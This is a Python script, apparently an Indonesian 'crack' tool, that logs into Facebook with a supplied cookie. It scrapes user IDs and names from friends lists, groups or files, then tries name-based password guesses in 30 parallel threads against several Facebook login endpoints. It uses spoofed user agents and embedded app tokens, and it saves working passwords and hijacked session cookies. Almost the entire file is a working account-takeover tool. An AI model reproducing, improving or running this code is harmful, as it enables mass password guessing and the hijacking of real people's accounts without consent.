
# Source By   : Fajar Khafi (Kato Kyta)                  
# This script is free, don't sell it!               

import re, requests, random, json, sys, time, datetime, os, uuid, base64, string,subprocess,calendar
from concurrent.futures import ThreadPoolExecutor as Thread
from time import time as FajarTime
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as beautifulsoup
from datetime import date,datetime
from string import *

#rich
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich import print as prints
from rich.tree import Tree
from rich.panel import Panel
ses = requests.Session()

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
J = "\x1b[38;5;208m" # Jingga
A = '\x1b[1;90m' # WARNA ABU ABU

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

#global
id1,id2,loop,ok,cp = [],[],0,0,0
agen,agen2 = [],[]
metode, pwpluss, pwnya,  tokenku = [], [], [], []
rr = random.randint
rc = random.choice
sys.stdout.write(f'\x1b]2; ( Kyta FB )\x07')

#--- > time 
sasi = ["Jan", "Feb", "Mar", "Apr", "Mei", "Jun", "Jul", "Agu", "Sep", "Okt", "Nov", "Des"]
tete = {"01": "Jan", "02": "Feb", "03": "Mar", "04": "Apr", "05": "Mai", "06": "Jun", "07": "Jul", "08": "Agu", "09": "Sep", "10": "Okt", "11": "Nov", "12": "Des"}
now = datetime.now()
hari = now.day
blx = now.month
try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()
#if hp not in out:exit()
bulan = sasi[xx]
tahun = now.year
tanggal = str(hari)+'-'+str(bulan)+'-'+str(tahun)
ress_ok = f'OK-{hari}-{bulan}-{tahun}.txt'
ress_cp = f'CP-{hari}-{bulan}-{tahun}.txt'


class MainTermux(object):
      def __init__(self, **ingfo):
          try:ingfo.update({'Author': sys.argv[1]})
          except:exit(' [!] Gagal Masuk Ke Menu Jalankan Ulang Dengan Perintah Di Bawah Ini\nRun: python {} Katoky'.format(sys.argv[0]))
          if ingfo.get('Author') == ('Katoky') or ingfo.get('Author').lower() == ('Katoky'):
             xxxx = os.getcwd()
             if os.path.isfile('.token.txt') is True:
                if os.path.isfile('.cok.txt') is True:
                	menu()
             else:
                 try:
                     subrek = open("data/foll.fb","r").read()
                 except:
                     open("data/foll.fb","w").write("sudah follow")
                     os.system("xdg-open https://www.facebook.com/fajar.xzyra")
             Cookies()
          else:
             exit('Utamakan Baca Dulu Di Github Aku\nRun: python {} Katorky'.format(sys.argv[0]))

def Cookies():
	try:
		os.system("clear")
		print('%s___________ ________.    %s__%s'%(P,M,P))
		print('%s\_   _____// ____\_ |__ %s|  | ____ __%s'%(P,M,P)) 
		print('%s |    __)_\   __\ | __ \%s|  |/ /  |  \%s'%(P,M,P))
		print('%s |        \|  |   | \_\ \%s    <|  |  /%s'%(P,M,P))
		print('%s/_______  /|__|   |___  /%s__|_ \____/%s'%(P,M,P)) 
		print('%s        \/            \/ %s    \/%s'%(P,M,P))
		prints(f' [!] [underline]{H2}source by Kato Kyta{P2}') # jangan di ganti ya ajg
		print("\n [!] Informasi : Harap gunakan akun tumbal")
		cok = input(f' [!] masukan cookie : ')
		cos = {'cookie':cok}; data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}; req  = ses.post('https://graph.facebook.com/v16.0/device/login/',data=data).json(); cd   = req['code']; ucd  = req['user_code']; url  = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038'%(cd); req  = parser(ses.get('https://mbasic.facebook.com/device',cookies=cos).content,'html.parser'); raq  = req.find('form',{'method':'post'}); dat  = {'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1), 'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1), 'qr' : '0', 'user_code' : ucd}; rel  = 'https://mbasic.facebook.com' + raq['action']; pos  = parser(ses.post(rel,data=dat,cookies=cos).content,'html.parser')
		dat  = {}
		raq  = pos.find('form',{'method':'post'})
		for x in raq('input',{'value':True}):
			try:
				if x['name'] == '__CANCEL__':
					pass
				else:
					dat.update({x['name']:x['value']})
			except Exception as e:
				pass
		rel = 'https://mbasic.facebook.com' + raq['action']; pos = parser(ses.post(rel,data=dat,cookies=cos).content,'html.parser'); req = ses.get(url,cookies=cos).json(); tok = req['access_token']; kot = open('.token.txt','w').write(tok); koc = open('.cok.txt','w').write(cok); print(f'{P} [!] Login Sukses')
		print('\n [!] Your Token : {}'.format(req['access_token']));exit()
	except Exception as e:
		print(f'{M}{str(e)}');exit()

	
def menu_ku():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:exit("cookie non aktive");time.sleep(1);Cookies()
	try:
		link = requests.Session().get('https://graph.facebook.com/me?fields=id,name&access_token=%s'%(token),cookies={'cookie':cok})
		nami = json.loads(link.text)['name']
		user = json.loads(link.text)['id']
	except KeyError:Cookies()
	except requests.exceptions.ConnectionError:exit(' [!] Tidak ada koneksi.')
	os.system("clear")
	print('%s___________ ________.    %s__%s'%(P,M,P))
	print('%s\_   _____// ____\_ |__ %s|  | ____ __%s'%(P,M,P)) 
	print('%s |    __)_\   __\ | __ \%s|  |/ /  |  \%s'%(P,M,P))
	print('%s |        \|  |   | \_\ \%s    <|  |  /%s'%(P,M,P))
	print('%s/_______  /|__|   |___  /%s__|_ \____/%s'%(P,M,P)) 
	print('%s        \/            \/ %s    \/%s'%(P,M,P))
	prints(f' [!] [underline]{H2}source by Kato Kyta{P2}') # jangan di ganti ya ajg
	print('\n %s[!] username : %s%s%s'%(P,H,nami,P))
	print(' %s[!] user uid : %s%s%s'%(P,H,user,P))
	print()
	print(' %s[!] 01. crack %sin%s random %spublik%s'%(P,M,P,H,P))
	print(' %s[!] 02. crack %sin%s random %sgroup%s'%(P,M,P,H,P))
	print(' %s[!] 03. crack %sin%s random %sfile%s'%(P,M,P,H,P))
	print(' %s[!] 04. Logout%s Delete cookie %s'%(P,M,P))
def crack_file():
	print()
	file = input(f' [!] file name : ')
	try:
		uuid = open(file,'r').readlines()
		for data in uuid:
			try:user,nama = data.split('|')
			except:exit(f" [!] pemisah salah")
			id1.append(data)
			print('\r [!] sedang dump %s id'%(len(id1)),end=" ")
			time.sleep(0.0000003)
	except FileNotFoundError:exit(f" [|] file tidak ada")
	print()
	Setting()
	
def grup(url):
	try:
		link=parser(ses.get(url).text,'html.parser')
		for uid in re.findall('data-sigil="feed_story_(.*?)class="img',str(link)):
			for user in re.findall('ring(.*?)"',str(uid)):
				for nama in re.findall('label="(.*?),',str(uid)):
					if user+'|'+nama in id1:pass
					else:id1.append(user+'|'+nama)
					print(' [!] CTL + C untuk berhenti dump ')
					print(f" [!] {M}{len(id1)}{P}      ", end='\r');time.sleep(0.0000100)
		for x in link.find_all('a',href=True):
			if x.text == 'Lihat Postingan Lainnya…':
				grup('https://iphone.facebook.com'+x.get('href'))
	except:pass

def Publik():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except Exception as e:print(f" {str(e).title()})");time.sleep(5);Cookies()
	except requests.exceptions.ConnectionError:exit(' [!] Tidak ada koneksi.')
	print()
	print('%s [!] pastikan %suid%s bersifat publik%s'%(P,H,P,P))
	user2 = input(' [!] uid: ')
	for uid in user2.split(','):
		try:
			date = ses.get(f'https://graph.facebook.com/v14.0/{uid}?fields=name,friends.limit(5000)&access_token={token}',cookies = {'cookies':cok}).json()
			search = date["name"]
			for x in date["friends"]["data"]:
				try:
					id1.append(x["username"]+"|"+x["name"])
				except:
					id1.append(x["id"]+"|"+x["name"])
					print(f" [!] {H}{str(search)}|{M}{len(id1)}{P}      ", end='\r')
		except (KeyError,IOError):
			print(f' [!] id {uid} private',end='\r');time.sleep(0.1)
	try:
		print(f"\r [!] Total Dump %s User"%(str(len(id1))))
		Setting()
	except requests.exceptions.ConnectionError: 
		print(" [!] koneksi internet anda buruk")
		
def menu_mtd():
	print()
	if len(id1)==0:
		exit('uid tidak publik')
	
	for bacot in id1:
		xx = random.randint(0,len(id2))
		id2.insert(xx,bacot)

	print(' %s[!] 01. https://m.facebook .com %sregular%s'%(P,H,P))
	print(' %s[!] 02. https://m.alpha.facebook.com %sascny%s'%(P,H,P))
	print(' %s[!] 03. https://graph.facebook.com%sgraph%s'%(P,H,P))
	
def hasil():
	print("%s [!] %sResults OK Tersimpan Di : %s%s"%(P,H,ress_ok,P))
	print("%s [!] %sResults CP Tersimpan Di : %s%s\n"%(P,K,ress_cp,P))
	
def take_password():
	global prog,des
	print()
	hasil()
	prog = Progress(TextColumn('{task.description}'),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with Thread(max_workers=30) as fajar_ganteng:
			for user in id2:
				uix, nama = user.split("|")[0], user.split("|")[1].lower()
				depan = nama.split(" ")[0]
				if len(nama) <=5:
					if len(depan) <=1 or len(depan) <=2:pass
					else:
						pwid = [
							depan+"123",
							depan+"1234",
							depan+"12345",
							depan+"01",
							depan+"02",
							depan+"03",
							depan+"04",
							depan+"05",
							nama.lower()
						]
				else:
					pwid = [
						nama,
						nama.lower(),
						depan+"123",
						depan+"1234",
						depan+"12345",
						depan+"01",
						depan+"02",
						depan,
						depan.lower()
					]
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwid.append(xpwd)
				else:pass
				if 'id_1' in metode:fajar_ganteng.submit(crack1,uix,pwid)
				elif 'id_2' in metode:fajar_ganteng.submit(crack2,uix,pwid)
				elif 'id_3' in metode:fajar_ganteng.submit(crack3,uix,pwid)
				else:fajar_ganteng.submit(crack1,id2,uix,pwid)
		exit("\n\ncracking done!")

	
def crack1(uix,pwid):
	global loop,ok,cp
	prog.update(des,description=f" [!] {P2}{len(id2)} {H2}Live {P2}:-{H2}{(ok)} {K2}Check {P2}:-{K2}{(cp)} {P2}({H2}{str(uix)}-{P2} : {(loop)}{P2})")
	prog.advance(des)
	for pw in pwid:
		try:
			ua = random.choice(agen)
			ua2 = random.choice(agen2)
			ses = requests.Session()
			link = ses.get("https://mbasic.facebook.com/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fweb%2Flogin-button%3Flocale%3Did_ID&refsrc=deprecated&_rdr")
			data = {'lsd':re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'m_ts':re.search('"m_ts" value="(.*?)"',str(link.text)).group(1),'li':re.search('"li" value="(.*?)"',str(link.text)).group(1),'try_number': '0','unrecognized_tries': '0','email':uix,'pass':pw,'login': 'Masuk','bi_xrwh':re.search('"bi_xrwh" value="(.*?)"',str(link.text)).group(1)}
			params = {'refsrc': 'deprecated','lwv': '100'}
			headers = {'authority': 'mbasic.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control': 'max-age=0','origin': 'https://mbasic.facebook.com','referer': 'https://mbasic.facebook.com/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fweb%2Flogin-button%3Flocale%3Did_ID&refsrc=deprecated&_rdr','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"','sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"9.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'viewport-width': '980'}
			response = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fweb%2Flogin-button%3Flocale%3Did_ID&',params=params,headers=headers, data=data,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f' {P}[{H}/{P}] {H}{uix}|{pw}{P}')
				print(f'  {H}locale=id_ID;{kuki}{P}')
				open('OK/'+ress_ok,'a').write(uix+'|'+pw+'|'+kuki+'\n')
				ok+=1
				break
			elif "checkpoint" in response.cookies.get_dict():
				print(f' {P}[{K}/{P}] {K}{uix}|{pw}{P}')
				cp+=1
				open('CP/'+ress_cp,'a').write(uix+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def crack2(uix,pwid):
	global loop,ok,cp
	prog.update(des,description=f" [!] {P2}{len(id2)} {H2}Live {P2}:-{H2}{(ok)} {K2}Check {P2}:-{K2}{(cp)} {P2}({H2}{str(uix)}-{P2} : {(loop)}{P2})")
	prog.advance(des)
	for pw in pwid:
		try:
			ua2 = random.choice(agen2)
			ses = requests.Session()
			Head1 = ({"connection": "keep-alive", "accept-language": "id,en-US;q=0.9,en;q=0.8", "sec-fetch-mode": "navigate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "sec-fetch-sest": "document", "sec-fetch-site": "none", "cache-control": "max-age=0", "sec-fetch-user": "?1", "upgrade-insecure-requests": "1", "host": "m.alpha.facebook.com", "user-agent": ua2})
			ress = ses.get('https://m.alpha.facebook.com/login.php?',headers = Head1).text
			Data = {
				'm_ts': re.search('name="m_ts" value="(.*?)"', str(ress)).group(1),
				'li': re.search('name="li" value="(.*?)"', str(ress)).group(1),
				'try_number': 0,
				'unrecognized_tries': 0,
				'email': uix,
				'prefill_contact_point': uix,
				'prefill_source': 'browser_dropdown',
				'prefill_type': 'password',
				'first_prefill_source': 'browser_dropdown',
				'first_prefill_type': 'contact_point',
				'had_cp_prefilled': True,
				'had_password_prefilled': True,
				'is_smart_lock': False,
				'bi_xrwh': 0,
				'encpass': f"#PWD_BROWSER:0:{str(FajarTime()).split('.')[0]}:{pw}",
				'fb_dtsg': re.search('{"dtsg":{"token":"(.*?)"', str(ress)).group(1),
				'jazoest': re.search('name="jazoest" value="(\d+)"', str(ress)).group(1),
				'lsd': re.search('name="lsd" value="(.*?)"', str(ress)).group(1),
				'__dyn': '',
				'__csr': '',
				'__req': random.choice(['1','2','3','4','5']),
				'__a': re.search('"encrypted":"(.*?)"', str(ress)).group(1),
				'__user': 0
			}
			Head = {
				'Connection': 'keep-alive',
				'Accept': '*/*',
				'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
				'sec-ch-ua-mobile': '?1',
				'Origin': 'https://m.alpha.facebook.com',
				'X-FB-LSD': re.search('name="lsd" value="(.*?)"', str(ress)).group(1),
				'X-ASBD-ID': '129477',
				'Content-Type': 'application/x-www-form-urlencoded',
				'Content-Length': str(len((Data))),
				'sec-ch-ua-platform': '"Android"',
				'Sec-Fetch-Site': 'same-origin',
				'Referer': 'https://m.alpha.facebook.com/login.php?',
				'Host': 'm.alpha.facebook.com',
				'Sec-Fetch-Mode': 'cors',
				'Sec-Fetch-Dest': 'empty',
				'User-Agent':ua2,
				'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="{}", "Chromium";v="{}"'.format(re.search('Chrome/(\d+).', str(ua2)).group(1), re.search('Chrome/(\d+).', str(ua2)).group(1)),
				'Accept-Encoding': 'gzip, deflate, br',
				'viewport-width': '424'
			}
			ress2 = ses.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', headers = Head, data = Data, allow_redirects = False)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f' {P}[{H}/{P}] {H}{uix}|{pw}{P}')
				print(f'  {H}locale=id_ID;{kuki}{P}')
				open('OK/'+ress_ok,'a').write(uix+'|'+pw+'|'+kuki+'\n')
				ok+=1
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print(f' {P}[{K}/{P}] {K}{uix}|{pw}{P}')
				cp+=1
				open('CP/'+ress_cp,'a').write(uix+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


def xxxc():
	device = random.choice(['RMX1831',''])
	denin = random.choice(["{density=2.25,height=1092,width=2082};]","{density=2.0,height=850,width=750};]","{density=3.0,height=1082,width=1092};]","{density=2.25,height=2093,width=1093};]",'{density=3.0,height=1995,width=1836};]', '{density=3.0,height=1483,width=1829};]', '{density=2.25,height=1577,width=2027};]', '{density=2.0,height=1073,width=1016};]', '{density=2.0,height=1278,width=1286};]', '{density=3.0,height=1885,width=1099};]', '{density=2.0,height=1086,width=1798};]', '{density=2.0,height=2027,width=1725};]', '{density=2.25,height=1405,width=1829};]', '{density=2.0,height=1473,width=1806};]', '{density=3.0,height=1637,width=1294};]', '{density=2.0,height=1851,width=1173};]', '{density=2.25,height=1373,width=1416};]', '{density=2.25,height=1446,width=1251};]', '{density=3.0,height=1883,width=1093};]', '{density=2.25,height=1059,width=1542};]', '{density=2.0,height=1151,width=1273};]', '{density=3.0,height=1620,width=1840};]', '{density=3.0,height=1717,width=1745};]', '{density=2.25,height=1161,width=1541};]', '{density=2.0,height=1060,width=1132};]', '{density=2.25,height=1282,width=2024};]', '{density=2.25,height=1191,width=1221};]', '{density=2.25,height=1349,width=1788};]', '{density=2.0,height=1608,width=1794};]', '{density=2.0,height=1495,width=1906};]',])
	uai  = f"Davik/2.1.0 (Linux; U; Android {str(rr(4,13))}; RMX1941 Build/PPR1.180610.011) [FBAN/MessengerLite;FBAV/{str(rr(40,360))}.325.0.0.5.56;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/919886436;FBCR/XL Axiata;FBMF/Realme;FBBD/Realme;FBDV/RMX1941;FBSV/{str(rr(4,13))};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+f"{denin};"
	return uai
	
def crack3(uix,pwid):
	global loop,ok,cp
	prog.update(des,description=f" [{M2}/{P2}] {P2}{len(id2)} {H2}Live {P2}:-{H2}{(ok)} {K2}Check {P2}:-{K2}{(cp)} {P2}({H2}{str(uix)}-{P2} : {(loop)}{P2})")
	prog.advance(des)
	for pw in pwid:
		try:
			pw = pw.lower()
			ua3 = xxxc()
			r = requests.Session()
			head = {'Host':'graph.facebook.com','x-fb-connection-bandwidth': repr(random.randint(2e7, 3e7)), 'x-fb-sim-hni': repr(random.randint(2e4, 4e4)), 'x-fb-net-hni': repr(random.randint(2e4, 4e4)),'x-fb-connection-quality': 'EXCELLENT','user-agent': ua3,'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
			date = {'access_token': '200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',  'format': 'JSON', 'sdk_version': {random.randrange(2, 31)}, 'email': uix, 'locale': 'id_ID', 'password': pw, 'sdk': 'android', 'generate_session_cookies': '1', 'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'}
			xnxx = r.post("https://graph.facebook.com/auth/login", params=date, headers=head, allow_redirects=False)
			if 'session_key' in xnxx.text:
				ok+=1
				q = json.loads(xnxx.text)
				coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
				sbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				kuki = f"sb={sbb};{coki}"
				print(f' {P}[{H}/{P}] {H}{uix}|{pw}{P}')
				print(f'  {H}locale=id_ID;{kuki}{P}')
				open('OK/'+ress_ok,'a').write(uix+'|'+pw+'|'+kuki+'\n')
				break
			elif 'www.facebook.com' in xnxx.text:
				print(f' {P}[{K}/{P}] {K}{uix}|{pw}{P}')
				open('CP/'+ress_cp,'a').write(uix+'|'+pw+'\n')
				cp+=1
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

for xd in range(1000):
	uasm = f'Mozilla/5.0 (Linux; Android {str(rr(9,13))}; SM-S115DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(90,100))}.0.{str(rr(4000,4999))}.{str(rr(70,125))} Mobile Safari/537.36'
	uasn = f'Mozilla/5.0 (Linux; Android ,{str(rr(9,13))}; SAMSUNG SM-G8850) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.2 Chrome/{str(rr(70,100))}.0.{str(rr(3000,4999))}.{str(rr(75,150))} Mobile Safari/537.36'
	uaz = f'SAMSUNG-GT-S5611 Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; it) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16'
	uaiz = f'Opera/9.80 (Android; Opera Mini/10.0.{str(rr(1000, 3000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; en) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16'
    uaku2 = random.choice([uasm, uasn, uaz, uaiz])
    agen2.append(uaku2)
	
def menu():
	menu_ku()
	Fajar = input(f" [!] ᴩɪʟɪʜᴀɴ : ")
	if Fajar =="1" or Fajar =="01":
		Publik()
		
	elif Fajar =='2' or Fajar =='02':
		print()
		prints(f" [!]{H2} masukan id grup yang bersifat publik {P2}")
		user = input(" [!] mauskan id : ")
		for uid in user.split(','):
			if user == '' or user == ' ':
				print(" id tidak valid")
			else:
				grup('https://iphone.facebook.com/groups/'+uid+'/')
		Setting()
		
	elif Fajar =="3" or Fajar =="03":
		crack_file()
		
	elif Fajar =="4" or Fajar =="04":
		os.remove('.cok.txt');os.remove('.token.txt');exit(" [!] Logout berhasil")
	
	else:
		print(' [!] pilih yang bener tod');time.sleep(2);menu()
		
def Setting():
	
	menu_mtd()
	Fz = input(f' [!] ᴩɪʟɪʜᴀɴ : ')
	if Fz =='1' or Fz =='01':
		metode.append('id_1')
	elif Fz =='2' or Fz =='2':
		metode.append('id_2')
	elif Fz =='3' or Fz =='3':
		metode.append('id_3')
	else:
		metode.append('id_2')
		
	print()
	pwplus=input(' [!] tambahkan sandi manual? y/t : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(' [!] Masukkan Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
		print(f" [!] crack dengan sandi -> bawaan sc")
		
	take_password()
	

def AutoFolder():
    try:os.mkdir("OK")
    except:pass
    try:os.mkdir("CP")
    except:pass
    try:os.mkdir("data")
    except:pass
    
###----------[ PEMANGGIL ]---------- ###
if __name__=='__main__':
  try:
      with requests.Session() as ses:
           os.system("git pull")
           AutoFolder();menu()
  except requests.exceptions.ConnectionError:
      prints(f"{H2} [!]{P2} koneksi internet anda bermasalah")
      time.sleep(3);exit()
 